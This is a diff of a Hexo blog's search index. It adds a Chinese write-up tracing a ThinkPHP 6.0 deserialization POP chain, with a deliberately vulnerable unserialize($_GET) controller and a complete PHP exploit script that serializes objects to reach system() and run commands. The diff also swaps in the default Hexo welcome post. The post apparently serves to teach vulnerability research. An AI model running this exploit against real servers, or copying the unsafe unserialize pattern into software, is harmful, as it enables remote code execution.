@@ -1,6 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ThinkPHP6.0.*反序列化漏洞-1</title>
+    <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
+    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>
+
+<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
+<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
+<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
+<ol>
+<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
+<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
+</ol>
+<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
+<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
+<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
+<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
+<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>调用过程如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
+        <tag>ThinkPHP</tag>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQLi 基础知识</title>
     <url>/2022/03/19/SQLi-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL 注入是一种网络安全漏洞，允许攻击者<strong>干扰</strong>应用程序对其<strong>数据库</strong>的<strong>查询</strong>。它通常允许攻击者<strong>查看他们通常无法检索的数据</strong>。这可能包括属于<strong>其他用户</strong>的数据，或<strong>应用程序</strong>本身能够<strong>访问</strong>的任何其他数据。在许多情况下，攻击者可以<strong>修改</strong>或<strong>删除</strong>此数据，从而导致对应用程序的内容或行为的持续更改。<br>在某些情况下，攻击者可以升级 SQL 注入攻击以<strong>危害底层服务器</strong>或其他后端基础设施，或执行拒绝服务攻击。 （来自<a href="https://portswigger.net/web-security/sql-injection">这里</a>）。 </p>
@@ -187,58 +241,22 @@
       </tags>
   </entry>
   <entry>
-    <title>ThinkPHP6.0.*反序列化漏洞-1</title>
-    <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
-    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>
+    <title>Hello World</title>
+    <url>/2022/03/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
-<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
-<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
-<ol>
-<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
-<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
-</ol>
-<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
-<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
-<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
-<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
-<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>调用过程如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>
-
-<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span 